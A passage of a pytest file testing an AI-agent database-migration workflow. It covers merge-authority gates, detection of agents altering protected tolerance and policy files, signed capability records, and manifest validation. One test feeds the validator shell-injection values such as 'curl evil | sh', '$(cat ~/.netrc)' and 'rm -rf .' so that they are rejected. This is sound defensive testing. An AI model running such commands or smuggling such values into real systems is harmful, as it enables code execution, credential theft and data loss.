    out = _run_one(ns_with(named, ["data"]), {**_pass_nomerge, "merge_eligible": False})   # the entry must be claimed
    assert out["status"] == "FAIL" and "mo-u" in out["one_line_summary"]


def test_one_ineligible_unit_in_the_batch_needs_the_override_even_when_the_child_says_eligible():
    ns = _batch_runtime()
    ns["MANIFEST"] = {"merge_overrides": [{"decision": "mo-all", "units": ["u", "u2", "u3"]}]}
    ns["unit_recon"] = lambda head, units: {"u": (True, []), "u2": (False, ["rerun_policy"]), "u3": (None, ["rerun_policy"])}

    def run(report):
        async def agent(prompt, **kwargs):
            return dict(report)
        ns["agent"] = agent
        batch = {"id": "b", "units": ["u", "u2", "u3"], "write_targets": ["t"], "brief": "b"}
        return asyncio.run(ns["run_batch"](batch, asyncio.Semaphore(1), ns["Breaker"](3)))

    base = {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "merge_eligible": True,
            "pr_url": "https://example/pr/1", "branch": "f", "changed_paths": [], "one_line_summary": "ok"}
    out = run(base)
    assert out["status"] == "FAIL" and out["failure_class"] == "merge_authority" and "merge_authority" not in out
    assert "recon/u2/result.json" in out["one_line_summary"] and "merge_eligible=False" in out["one_line_summary"]
    assert "recon/u3/result.json" in out["one_line_summary"] and "missing or malformed" in out["one_line_summary"]
    out = run({**base, "merge_authority": {"kind": "human_override", "decision_id": "mo-all"}})
    assert out["status"] == "PASS" and out["merge_authority"] == {"kind": "human_override", "decision_id": "mo-all"}
    # an entry covering only part of the batch clears nothing
    ns["MANIFEST"] = {"merge_overrides": [{"decision": "mo-part", "units": ["u", "u2"]}]}
    out = run({**base, "merge_authority": {"kind": "human_override", "decision_id": "mo-part"}})
    assert out["status"] == "FAIL" and out["failure_class"] == "merge_authority"


def test_child_schema_and_prompt_carry_merge_eligible_and_merge_authority():
    tree = _tree()
    schema = next(ast.literal_eval(n.value) for n in tree.body
                  if isinstance(n, ast.Assign) and any(isinstance(t, ast.Name) and t.id == "CHILD_SCHEMA" for t in n.targets))
    assert "merge_eligible" in schema["required"] and schema["properties"]["merge_eligible"]["type"] == "boolean"
    assert schema["properties"]["merge_authority"]["properties"]["kind"]["enum"] == ["harness", "human_override"]
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"](_manifest()["batches"][0])
    assert "merge_eligible" in child and "merge_overrides" in child
    passed = [{"batch": "b", "units": ["u"], "pr_url": "https://example/pr/1",
               "merge_authority": {"kind": "human_override", "decision_id": "mo-u"}}]
    verify = ns["verify_prompt"](passed)
    assert "human_override" in verify and "mo-u" in verify


def test_prompts_name_every_merge_evidence_mode():
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"](_manifest()["batches"][0])
    verify = ns["verify_prompt"]([{"batch": "b", "pr_url": "https://example/pr/1"}])
    for mode in ("live", "snapshot", "transactional"):
        assert mode in child and mode in verify
    assert "Fixture evidence is never PASS" in child


# ---------------------------------------------------------------- protected-files gate (changed_paths)

PROTECTED_FILES = [".migration/recon_tolerances.json", ".migration/allowed_targets.json",
                   ".migration/authorizations.json", ".migration/capabilities.json",
                   ".migration/units/u/mapping_spec.json", ".migration/waves/wave-0.json"]


def _pass(**extra):
    return {"status": "PASS", "recon_verdict": "PASS", "recon_mode": "live", "merge_eligible": True,
            "pr_url": "https://example/pr/1", "branch": "f",
            "one_line_summary": "ok", **extra}


def test_clean_diff_stays_pass_and_recon_evidence_for_its_own_units_is_allowed():
    ns = _batch_runtime()
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql", ".migration/recon/u/result.json"]))
    assert out["status"] == "PASS" and "failure_class" not in out
    assert ns["protected_files_violations"](["a.py", ".migration/recon/u/x", ".migration/recon/u/deep/y"], ["u"]) == []


@pytest.mark.parametrize("path", PROTECTED_FILES + [".migration/recon/other_unit/result.json", ".migration/recon/wave-1/report.md"])
def test_diff_touching_a_protected_file_is_downgraded_to_protected_files_tampered(path):
    out = _run_one(_batch_runtime(), _pass(changed_paths=["src/loans.sql", path]))
    assert out["status"] == "FAIL" and out["failure_class"] == "protected_files_tampered"
    assert path in out["one_line_summary"] and out["one_line_summary"].startswith("PASS downgraded")


@pytest.mark.parametrize("report", [_pass(), _pass(changed_paths="src/x.sql"), _pass(changed_paths=[".migration/x", 3])])
def test_pass_without_a_usable_changed_paths_is_not_pass(report):
    out = _run_one(_batch_runtime(), report)
    assert out["status"] == "FAIL" and out["failure_class"] == "protected_files_tampered"
    assert "changed_paths" in out["one_line_summary"]


def test_a_failed_child_that_touched_a_protected_file_is_still_reclassified():
    out = _run_one(_batch_runtime(), {"status": "FAIL", "recon_verdict": "FAIL", "recon_mode": "live",
                                      "failure_class": "decimal_rounding", "one_line_summary": "off by one",
                                      "changed_paths": [".migration/recon_tolerances.json"]})
    assert out["failure_class"] == "protected_files_tampered"


def test_breaker_counts_protected_file_tampering():
    ns = _batch_runtime()

    async def agent(prompt, **kwargs):
        return _pass(changed_paths=[".migration/allowed_targets.json"])

    ns["agent"] = agent

    async def exercise():
        breaker = ns["Breaker"](3)
        for i in range(3):
            await ns["run_batch"]({"id": f"b{i}", "units": ["u"], "write_targets": ["t"], "brief": "b"},
                                  asyncio.Semaphore(1), breaker)
        return breaker

    assert asyncio.run(exercise()).tripped_on == "protected_files_tampered"


def test_child_schema_requires_changed_paths():
    tree = _tree()
    ns = {t.id: ast.literal_eval(node.value) for node in tree.body if isinstance(node, ast.Assign)
          for t in node.targets if isinstance(t, ast.Name) and t.id.endswith("_SCHEMA")}
    for schema in (ns["CHILD_SCHEMA"], ns["VERIFY_SCHEMA"]):
        assert "changed_paths" in schema["required"]
        assert schema["properties"]["changed_paths"]["items"] == {"type": "string"}
        assert "git diff --name-only" in schema["properties"]["changed_paths"]["description"]


def test_prompts_demand_changed_paths_and_base_branch_policy_files():
    ns = _prompt_ns(_manifest())
    child = ns["child_prompt"](_manifest()["batches"][0])
    assert "git diff --name-only" in child and "changed_paths" in child
    assert ".migration/recon/<unit_id>/" in child and "protected_files_tampered" in child
    verify = ns["verify_prompt"]([{"batch": "b", "units": ["u"], "pr_url": "https://example/pr/1"}])
    assert "git diff --name-only" in verify and "changed_paths" in verify
    assert "recon_tolerances.json" in verify and "allowed_targets.json" in verify
    assert "base branch" in verify and "not the PR" in verify
    assert ".migration/recon/<unit_id>/" in verify and "protected_files_tampered" in verify


def test_validate_verify_requires_changed_paths_inside_the_wave_report_dir():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "units": ["u"], "pr_url": "https://example/pr/3"}]
    ok = {"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "PASS"}, "findings": [],
          "changed_paths": [".migration/recon/wave-2/report.md"]}
    assert validate_verify(ok, passed, wave=2, observed=[]) == []
    problems = validate_verify({**ok, "changed_paths": [".migration/recon/wave-2/report.md",
                                                        ".migration/recon_tolerances.json"]}, passed, 2, [])
    assert problems == ["verifier output invalid: protected files tampered, changed .migration/recon_tolerances.json"]
    problems = validate_verify({**ok, "changed_paths": [".migration/recon/wave-3/report.md"]}, passed, 2, [])
    assert problems == ["verifier output invalid: protected files tampered, changed .migration/recon/wave-3/report.md"]
    problems = validate_verify({k: v for k, v in ok.items() if k != "changed_paths"}, passed, 2, [])
    assert problems == ["verifier output invalid: changed_paths must be a list of paths (git diff --name-only)"]


def test_validate_verify_reads_the_report_branch_from_git_not_only_the_self_report():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "units": ["u"], "pr_url": "https://example/pr/3"}]
    ok = {"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "PASS"}, "findings": [],
          "changed_paths": [".migration/recon/wave-2/report.md"]}
    assert validate_verify(ok, passed, wave=2, observed=[".migration/recon/wave-2/report.md"]) == []
    tampered = validate_verify(ok, passed, wave=2,
                               observed=[".migration/recon/wave-2/report.md", ".migration/allowed_targets.json"])
    assert tampered == ["verifier output invalid: protected files tampered, changed .migration/allowed_targets.json"]
    unverifiable = validate_verify(ok, passed, wave=2, observed=None)
    assert len(unverifiable) == 1 and "recon/wave-2" in unverifiable[0] and "git" in unverifiable[0]
    # `observed` is what the verifier itself changed (verifier_changed_paths): a passed unit's evidence in
    # it means the verifier rewrote it, which is not the verifier's to do
    problems = validate_verify(ok, passed, wave=2,
                               observed=[".migration/recon/wave-2/report.md", ".migration/recon/u/result.json"])
    assert problems == ["verifier output invalid: protected files tampered, changed .migration/recon/u/result.json"]
    src = WORKFLOW.read_text()
    assert 'validate_verify(verify, passed, TAG, verifier_changed_paths(TAG, passed))' in src


# ---------------------------------------------------------------- capability contract vs the doctor's record (A3)

DOCTOR = {"schema": "dbx-migration-factory/capabilities/1", "ready": True,
          "identity": {"userName": "sp-1", "service_principal": True, "host": "https://adb-1.azuredatabricks.net"},
          "checks": [{"id": "allowed_targets", "status": "ok", "data": {"catalogs": ["mig"], "guard_mode": "block"}},
                     {"id": "workspace", "status": "ok", "data": {}}]}


def test_validate_manifest_compares_the_contract_with_the_doctor_record():
    validate_manifest = _functions()["check_doctor_contract"]
    validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"])), DOCTOR)
    # the doctor records guard-normalized catalog names; a manifest spelling the guard accepts is the same contract
    validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"], catalogs=["`MIG` "])), DOCTOR)
    for caps, needle in ((_caps(), "host"),
                         (_caps(host="https://adb-2.azuredatabricks.net"), "host"),
                         (_caps(host=DOCTOR["identity"]["host"], identity="sp-2"), "identity"),
                         (_caps(host=DOCTOR["identity"]["host"], catalogs=["mig", "prod"]), "catalogs"),
                         (_caps(host=DOCTOR["identity"]["host"], guard_mode="warn"), "guard_mode")):
        with pytest.raises(SystemExit, match=f"capabilities.*{needle}.*capabilities.json"):
            validate_manifest(_manifest(capabilities=caps, auto_merge=False), DOCTOR)
    with pytest.raises(SystemExit, match="ready"):
        validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"])), {**DOCTOR, "ready": False})
    with pytest.raises(SystemExit, match="capabilities.json"):
        validate_manifest(_manifest(capabilities=_caps(host=DOCTOR["identity"]["host"])), {**DOCTOR, "identity": None})
    source = {"family": "sqlserver", "secret": "LEGACY_DSN", "params": {"db": "loans"}}
    with pytest.raises(SystemExit, match="manifest 'source' differs"):
        validate_manifest(_manifest(source=source), {**DOCTOR, "source": {**source, "secret": "OTHER_DSN"}})


def test_workflow_launches_from_the_signed_doctor_record_not_the_editable_one():
    src = WORKFLOW.read_text()
    assert "RECORDED" not in src
    assert "DOCTOR = signed_doctor_report(DOCTOR_PATH, MANIFEST_BYTES, MANIFEST_SHA)" in src
    assert ("DOCTOR = signed_doctor_report(DOCTOR_PATH, MANIFEST_BYTES, MANIFEST_SHA)\n"
            "check_doctor_contract(MANIFEST, DOCTOR)") in src
    assert "fresh_doctor_report" not in src and "DOCTOR_PY" not in src


def _launch_ns(tmp_path, fake_run=None):
    tree = _tree()
    selected = [node for node in tree.body
                if (isinstance(node, ast.FunctionDef)
                    and node.name in {"signed_doctor_report", "wave_signature", "pr_changed_paths",
                                      "ref_changed_paths", "wave_base", "evidence_in_pr",
                                      "verifier_changed_paths", "_git_paths", "_base_tip",
                                      "fetch_ref", "pr_head"})
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id in {"PR_URL", "UNIT_ID"} for t in node.targets))]
    ns = {"datetime": datetime, "hashlib": hashlib, "hmac": hmac, "json": json, "os": os, "re": re,
          "sys": sys, "subprocess": subprocess, "Path": Path, "ROOT": tmp_path,
          "BASE_BRANCH": "main", "BASE_SHA": "b" * 40, "REPO": "github.com/acme/dbx-target",
          "TAG": "orders-1", "MANIFEST": {"repo": "github.com/acme/dbx-target"},
          "MANIFEST_PATH": tmp_path / ".migration" / "waves" / "wave-1.json",
          "DOCTOR_MAX_AGE": datetime.timedelta(minutes=15),
          "HOOK_PROBE_RESULT": "blocked:0123abcd"}
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), ns)
    if fake_run is not None:
        ns["subprocess"] = type("S", (), {"run": staticmethod(fake_run), "SubprocessError": subprocess.SubprocessError,
                                            "CalledProcessError": subprocess.CalledProcessError})
    return ns


def test_signed_doctor_report_gate(tmp_path):
    sys.path.insert(0, str(WORKFLOW.parents[1] / "factory-doctor"))
    import doctor

    manifest_bytes = b'{"wave": 1}'
    report = {"ready": True, "identity": {"userName": "sp-1", "host": "h"},
              "hook_probe": "blocked:0123abcd", "checks": []}
    signed = doctor.sign_wave_report(report, manifest_bytes, signed_at="2026-01-01T00:00:00+00:00")
    path = tmp_path / "wave-1.doctor.json"
    path.write_text(json.dumps(signed))
    ns = _launch_ns(tmp_path)
    assert ns["signed_doctor_report"](path, manifest_bytes, doctor.manifest_sha(manifest_bytes),
                                      now=datetime.datetime(2026, 1, 1, 0, 1, tzinfo=datetime.timezone.utc)) == signed
    cases = [
        (None, manifest_bytes, "no doctor record"),
        (signed, b'{"wave": 2}', "another manifest"),
        (doctor.sign_wave_report(report, manifest_bytes, signed_at="2025-12-31T23:44:00+00:00"),
         manifest_bytes, "more than"),
        ({**signed, "signature": "0" * len(signed["signature"])}, manifest_bytes, "does not verify"),
        ({**signed, "signed_at": "2025-12-31T23:59:00+00:00"},
         manifest_bytes, "does not verify"),
        ({**signed, "ready": False}, manifest_bytes, "does not verify"),
    ]
    for value, mb, match in cases:
        if value is None:
            path.unlink(missing_ok=True)
        else:
            path.write_text(json.dumps(value))
        with pytest.raises(SystemExit, match=match):
            ns["signed_doctor_report"](path, mb, doctor.manifest_sha(mb),
                                       now=datetime.datetime(2026, 1, 1, 0, 1, tzinfo=datetime.timezone.utc))
    assert ns["wave_signature"](signed, manifest_bytes) == doctor.wave_signature(signed, manifest_bytes)


def _git_fake(calls, head, merged, paths):
    """git as the gate sees it: the PR head fetched into this workflow's own ref, origin/main at 't'*40 (fresh fetch),
    `merge-base --is-ancestor` answering whether the head is already in it, one diff."""
    def fake_run(cmd, **kw):
        calls.append(cmd)
        if cmd[3] == "fetch":
            return subprocess.CompletedProcess(cmd, 0)
        if cmd[3] == "rev-parse":
            return subprocess.CompletedProcess(cmd, 0, stdout=("t" * 40 if "origin/main^{commit}" in cmd else head) + "\n")
        if cmd[3] == "merge-base":
            return subprocess.CompletedProcess(cmd, 0 if merged else 1)
        return subprocess.CompletedProcess(cmd, 0, stdout=paths)
    return fake_run


def test_pr_changed_paths_comes_from_the_pr_head_ref_of_this_repo(tmp_path):
    calls = []
    ns = _launch_ns(tmp_path, _git_fake(calls, "c" * 40, False, "src/a.sql\n.migration/allowed_targets.json\n"))
    # the gated head's sha comes back with the paths: the verifier's tree is later held to exactly it
    assert ns["pr_changed_paths"]("https://github.com/acme/dbx-target/pull/42") == (
        "c" * 40, ["src/a.sql", ".migration/allowed_targets.json"])
    # the host writes refs/pull/N/head; the child's branch name never reaches git. The fetch lands in a ref
    # only this workflow writes: FETCH_HEAD is shared by every process in the clone, so a sibling
    # pipeline's fetch between the two commands would hand this wave another PR's head
    local = "refs/migration/wave-orders-1/refs/pull/42/head"
    assert calls[0] == ["git", "-C", str(tmp_path), "fetch", "-q", "origin", f"+refs/pull/42/head:{local}"]
    assert calls[1][3:] == ["rev-parse", "--verify", local + "^{commit}"]
    assert not any("FETCH_HEAD" in " ".join(c) for c in calls)
    # the base is fetched for the PR gate, while the launch snapshot remains fixed for verification
    assert calls[2][3:] == ["fetch", "-q", "origin", "+refs/heads/main:refs/remotes/origin/main"]
    assert calls[3][3:] == ["rev-parse", "--verify", "origin/main^{commit}"]
    assert calls[4][3:] == ["merge-base", "--is-ancestor", "c" * 40, "t" * 40]
    # --no-renames: a protected file moved under an allowed recon/ path must still surface its old path.
    # An unmerged head diffs from its own fork point on the base (three-dot against the fresh tip)
    assert calls[5][3:] == ["diff", "--name-only", "--no-renames", "t" * 40 + "..." + "c" * 40]
    assert len(calls) == 6
    calls.clear()
    # a head the base already contains (the verifier merged it before the run stopped, or a child merged
    # its own PR) would be its own merge base and diff to nothing: it is anchored at the launch base instead
    ns = _launch_ns(tmp_path, _git_fake(calls, "c" * 40, True, "src/a.sql\n"))
    assert ns["pr_changed_paths"]("https://github.com/acme/dbx-target/pull/42") == ("c" * 40, ["src/a.sql"])
    assert calls[5][3:] == ["diff", "--name-only", "--no-renames", "b" * 40 + "..." + "c" * 40]
    calls.clear()
    for url in ("https://github.com/other/repo/pull/42", "https://github.com/acme/dbx-target/pull/x",
                "https://github.com/acme/dbx-target/pull/42/../../other/repo/pull/1", "", None, 42):
        assert ns["pr_changed_paths"](url) is None
    assert calls == []

    def failing(cmd, **kw):
        raise subprocess.CalledProcessError(128, cmd)

    assert _launch_ns(tmp_path, failing)["pr_changed_paths"]("https://github.com/acme/dbx-target/pull/42") is None
    assert _launch_ns(tmp_path, failing)["ref_changed_paths"]("recon/wave-2") is None


def test_every_fetch_the_gate_makes_lands_in_this_workflows_own_ref(tmp_path):
    calls = []
    ns = _launch_ns(tmp_path, _git_fake(calls, "c" * 40, False, ""))
    assert ns["ref_changed_paths"]("recon/wave-orders-1") == ("c" * 40, [])
    assert calls[0][3:] == ["fetch", "-q", "origin", "+recon/wave-orders-1:refs/migration/wave-orders-1/recon/wave-orders-1"]
    assert calls[1][3:] == ["rev-parse", "--verify", "refs/migration/wave-orders-1/recon/wave-orders-1^{commit}"]
    calls.clear()
    assert ns["pr_head"]("https://github.com/acme/dbx-target/pull/7") == "c" * 40
    assert calls[0][3:] == ["fetch", "-q", "origin", "+refs/pull/7/head:refs/migration/wave-orders-1/refs/pull/7/head"]
    assert calls[1][3:] == ["rev-parse", "--verify", "refs/migration/wave-orders-1/refs/pull/7/head^{commit}"]
    assert ns["pr_head"]("https://github.com/other/repo/pull/7") is None
    assert "FETCH_HEAD" not in WORKFLOW.read_text()


def test_the_base_is_snapshotted_once_at_launch_before_any_wave_pr_can_merge(tmp_path):
    calls = []

    def fake_run(cmd, **kw):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout="a" * 40 + "\n")

    ns = _launch_ns(tmp_path, fake_run)
    assert ns["wave_base"]() == "a" * 40
    assert calls[0] == ["git", "-C", str(tmp_path), "fetch", "-q", "origin", "+refs/heads/main:refs/remotes/origin/main"]
    assert calls[1] == ["git", "-C", str(tmp_path), "rev-parse", "--verify", "origin/main^{commit}"]

    def failing(cmd, **kw):
        raise subprocess.CalledProcessError(128, cmd)

    with pytest.raises(SystemExit, match="main"):
        _launch_ns(tmp_path, failing)["wave_base"]()
    src = WORKFLOW.read_text()
    assert re.search(r"validate_manifest\(MANIFEST, PLUGIN\)\ncheck_wave_tag\(TAG, MANIFEST\)\nBASE_SHA = wave_base\(\)\n"
                      r"DOCTOR = signed_doctor_report", src)
    assert 'BASE_SHA_PATH' not in src and '"base_sha": BASE_SHA' in src


def test_verifier_changed_paths_is_the_verifier_branch_minus_the_gated_pr_trees_it_merged(tmp_path):
    calls = []
    # the verifier's tree per unit dir: u rewritten (differs from the gated head 1*40 and from the launch
    # base b*40), v byte-identical to its gated head, w untouched (differs from the gated head it did not
    # merge, auto_merge off, but equals the base)
    trees = {("1" * 40, ".migration/recon/u/"): ".migration/recon/u/result.json\n",
             ("b" * 40, ".migration/recon/u/"): ".migration/recon/u/result.json\n.migration/recon/u/rows.csv\n",
             ("2" * 40, ".migration/recon/v/"): "", ("b" * 40, ".migration/recon/v/"): ".migration/recon/v/result.json\n",
             ("3" * 40, ".migration/recon/w/"): ".migration/recon/w/result.json\n", ("b" * 40, ".migration/recon/w/"): ""}
    def fake_run(cmd, **kw):
        calls.append(cmd)
        if cmd[3] == "fetch":
            return subprocess.CompletedProcess(cmd, 0)
        if cmd[3] == "rev-parse":
            return subprocess.CompletedProcess(cmd, 0, stdout=("t" * 40 if "origin/main^{commit}" in cmd else "v" * 40) + "\n")
        if cmd[3] == "merge-base":
            return subprocess.CompletedProcess(cmd, 1)
        if "--" in cmd:
            return subprocess.CompletedProcess(cmd, 0, stdout=trees[cmd[6], cmd[9]])
        return subprocess.CompletedProcess(cmd, 0, stdout=(
            ".migration/recon/wave-2/report.md\nsrc/loans.sql\n.migration/recon/u/result.json\n"
            ".migration/recon/u/rows.csv\n.migration/recon/v/result.json\n.migration/recon_tolerances.json\n"))

    ns = _launch_ns(tmp_path, fake_run)
    passed = [{"batch": "b1", "units": ["u"], "pr_head": "1" * 40}, {"batch": "b2", "units": ["v"], "pr_head": "2" * 40},
              {"batch": "b3", "units": ["w"], "pr_head": "3" * 40}]
    # merged evidence byte-identical to the gated PR head drops out, so does evidence the verifier never
    # touched (its tree equals the launch base: with auto_merge off it merges nothing); a rewritten
    # result.json, the verifier's own report and anything else that reached the branch stay
    assert ns["verifier_changed_paths"](2, passed) == [
        ".migration/recon/u/result.json", ".migration/recon/wave-2/report.md",
        ".migration/recon_tolerances.json", "src/loans.sql"]
    assert calls[0][3:] == ["fetch", "-q", "origin", "+recon/wave-2:refs/migration/wave-orders-1/recon/wave-2"]
    assert calls[5][3:] == ["diff", "--name-only", "--no-renames", "t" * 40 + "..." + "v" * 40]
    assert calls[6][3:] == ["diff", "--name-only", "--no-renames", "1" * 40, "v" * 40, "--", ".migration/recon/u/"]
    assert calls[7][3:] == ["diff", "--name-only", "--no-renames", "b" * 40, "v" * 40, "--", ".migration/recon/u/"]
    assert calls[8][3:] == ["diff", "--name-only", "--no-renames", "2" * 40, "v" * 40, "--", ".migration/recon/v/"]
    assert calls[10][3:] == ["diff", "--name-only", "--no-renames", "3" * 40, "v" * 40, "--", ".migration/recon/w/"]
    assert calls[11][3:] == ["diff", "--name-only", "--no-renames", "b" * 40, "v" * 40, "--", ".migration/recon/w/"]
    # a passed batch whose gated head is unknown, or a diff git cannot answer: unverifiable, no PASS stands
    assert ns["verifier_changed_paths"](2, [{"batch": "b1", "units": ["u"]}]) is None

    def failing(cmd, **kw):
        raise subprocess.CalledProcessError(128, cmd)

    assert _launch_ns(tmp_path, failing)["verifier_changed_paths"](2, passed) is None


def test_git_observed_protected_file_changes_beat_a_clean_self_report():
    ns = _batch_runtime()
    seen = []
    ns["pr_changed_paths"] = lambda pr_url: seen.append(pr_url) or ("c" * 40, ["src/loans.sql", ".migration/recon_tolerances.json"])
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "FAIL" and out["failure_class"] == "protected_files_tampered"
    assert ".migration/recon_tolerances.json" in out["one_line_summary"]
    assert seen == ["https://example/pr/1"]  # the PR, not the branch the child names
    assert out["pr_head"] == "c" * 40  # the gated head, for the verifier's tree to be held to
    ns["pr_changed_paths"] = lambda pr_url: ("c" * 40, ["src/loans.sql"])
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "PASS" and out["pr_head"] == "c" * 40
    ns["pr_changed_paths"] = lambda pr_url: None
    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
    assert out["status"] == "FAIL" and out["failure_class"] == "protected_files_tampered" and "git" in out["one_line_summary"]


@pytest.mark.parametrize("value", ["--upload-pack=touch /tmp/x", "-q", "main..x", "a b", "", 3, "^main", "m:n"])
def test_validate_manifest_rejects_base_branch_and_wave_values_git_could_misread(value):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="base_branch"):
        validate_manifest(_manifest(base_branch=value))
    validate_manifest(_manifest(base_branch="release/2026.09"))
    with pytest.raises(SystemExit, match="wave"):
        validate_manifest(_manifest(wave="2 --exec"))


def test_validate_manifest_rejects_a_unit_owned_by_two_batches():
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="unit.*orders_load.*b1.*b2"):
        validate_manifest(_manifest(batches=[{"id": "b1", "units": ["orders_load"], "write_targets": ["t1"], "brief": "x"},
                                             {"id": "b2", "units": ["orders_load", "v"], "write_targets": ["t2"], "brief": "y"}]))


@pytest.mark.parametrize("unit", ["../recon_tolerances.json", "u/..", "a/b", "wave-1", "", ".", "..", ".hidden", 3])
def test_validate_manifest_rejects_unit_ids_that_are_not_a_plain_recon_dir_name(unit):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="unit id"):
        validate_manifest(_manifest(batches=[{"id": "b", "units": [unit], "write_targets": ["t"], "brief": "x"}]))
    validate_manifest(_manifest(batches=[{"id": "b", "units": ["orders_load", "u.v-2"], "write_targets": ["t"], "brief": "x"}]))


@pytest.mark.parametrize("source", ["LEGACY_ODBC", {"family": "sqlserver"}, {"secret": "X"}, {"family": "", "secret": "X"},
                                    {"family": "sqlserver", "secret": "X", "params": ["a=b"]},
                                    # these are pasted into the children's doctor command line
                                    {"family": "sqlserver; curl evil | sh", "secret": "X"},
                                    {"family": "sqlserver", "secret": "$(cat ~/.netrc)"},
                                    # secret is an environment variable NAME: no shell can set these
                                    {"family": "sqlserver", "secret": "secrets/legacy.dsn"},
                                    {"family": "sqlserver", "secret": "LEGACY.ODBC"},
                                    {"family": "sqlserver", "secret": "LEGACY-ODBC"},
                                    {"family": "sqlserver", "secret": "1LEGACY"},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": "loans && rm -rf ."}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db=x --unit": "y"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": "--role admin"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"as_of": "2026-09-08 18:43:52 x"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"as_of": "2026-09-08  18:43"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": "a'b"}},
                                    {"family": "sqlserver", "secret": "X", "params": {"db": 7}}])
def test_validate_manifest_checks_the_source_block(source):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="source"):
        validate_manifest(_manifest(source=source))
    validate_manifest(_manifest(source={"family": "postgres", "secret": "LAKEBASE_SRC", "params": {"db": "loan_servicing"}}))
    validate_manifest(_manifest(source={"family": "postgres", "secret": "_lakebase_src_2"}))


def test_param_values_follow_the_recon_contract_so_a_timestamp_is_accepted():
    """A mapping's ${as_of} is typically 'YYYY-MM-DD hh:mm:ss'; the recon CLI accepts exactly that
    (PARAM_RE), so the workflow must not reject it, and must quote it so the child's shell passes one value."""
    sys.path.insert(0, str(WORKFLOW.parents[1] / "data-reconciliation" / "harness"))
    from recon.cli import PARAM_RE
    ns = _functions()
    assert ns["PARAM_VALUE"].pattern == PARAM_RE.pattern.removeprefix("^").removesuffix("$")
    source = {"family": "sqlserver", "secret": "X", "params": {"as_of": "2026-09-08 18:43:52", "db": "loans"}}
    ns["validate_manifest"](_manifest(source=source))
    text = _prompt_ns(_manifest(source=source))["child_prompt"](_manifest()["batches"][0])
    flags = text[text.index("--source-family"):].split("`")[0]
    assert shlex.split(flags) == ["--source-family", "sqlserver", "--source-secret", "X",
                                  "--param", "as_of=2026-09-08 18:43:52", "--param", "db=loans"]


def test_child_prompt_passes_the_source_family_and_secret_to_the_doctor():
    ns = _prompt_ns(_manifest(source={"family": "postgres", "secret": "LAKEBASE_SRC", "params": {"db": "x"}}))
    text = ns["child_prompt"](ns["MANIFEST"]["batches"][0])
    assert "--source-family postgres --source-secret LAKEBASE_SRC --param db=x" in text
    assert "--source-family" not in _prompt_ns(_manifest())["child_prompt"](_manifest()["batches"][0])


# ---------------------------------------------------------------- G3: child contract without a per-child review, wave close


def _child_schema():
    tree = _tree()
    return next(ast.literal_eval(n.value) for n in tree.body
                if isinstance(n, ast.Assign) and any(isinstance(t, ast.Name) and t.id == "CHILD_SCHEMA" for t in n.targets))


def test_child_schema_has_no_review_fields_and_one_line_feedback_and_cost():
    schema = _child_schema()
    assert not {"review_clean", "review_head", "review_waiver"} & set(schema["properties"])
    assert not {"review_clean", "review_head", "review_waiver"} & set(schema["required"])
    assert schema["properties"]["skill_feedback"] == {"type": "array", "items": {"type": "string"},
                                                       "description": "one line per rule you had to derive yourself"}
    assert schema["properties"]["recon_cost"]["type"] == "object"
    assert set(schema["required"]) == {"status", "recon_verdict", "recon_mode", "merge_eligible", "write_targets",
                                       "changed_paths", "one_line_summary"}
    child = _prompt_ns(_manifest())["child_prompt"](_manifest()["batches"][0])
    assert "review_clean" not in child and "review_waived" not in child and "review_head" not in child


def test_a_pass_no_longer_needs_a_review_round():
    report = _pass(changed_paths=["src/a.sql"])
    for k in ("review_clean", "review_head"):
        report.pop(k, None)
    out = _run_one(_batch_runtime(), report)
    assert out["status"] == "PASS" and "failure_class" not in out and "review_waiver" not in out


def test_child_prompt_is_s2_shaped_and_under_900_words():
    brief = " ".join(f"word{i}" for i in range(300))
    m = _manifest(batches=[{"id": "b", "units": ["loans", "payments"], "write_targets": ["mig.loans", "mig.pay"],
                            "brief": brief, "gates": [GATE]}])
    text = _prompt_ns(m)["child_prompt"](m["batches"][0])
    assert len(text.split()) < 900, len(text.split())
    text = text[text.index("BRIEF:"):]                                     # the quoted skill body precedes it
    order = [text.index(s) for s in (
        '"loans"', "mig.loans",                                            # units and write targets
        "mapping_spec.json",                                               # converted files and mapping specs
        f"factory-doctor --role child --reuse-record .migration/waves/wave-0.doctor.json "
        f"--expect-identity sp-1 --expect-host {HOST}",                    # exact doctor shape
        "BLOCKED", "warn",                                                 # fail row blocks, warn continues
        "3 full runs", "tolerance",                                        # harness cap, never loosen
        "merge authority",                                                 # harness decides
        "exactly one PR", "first line",                                    # one PR, PASS/FAIL line 1
        "Do not merge",                                                    # no merge
        ".migration/recon/<unit_id>/",                                     # protected-files rule
        "one_line_summary",                                                # structured output
    )]
    assert order == sorted(order), order
    assert "hook probe" not in text.lower() and "Devin Review" not in text


def test_close_prompt_and_schema_carry_the_wave_close_review_round():
    ns = _prompt_ns(_manifest())
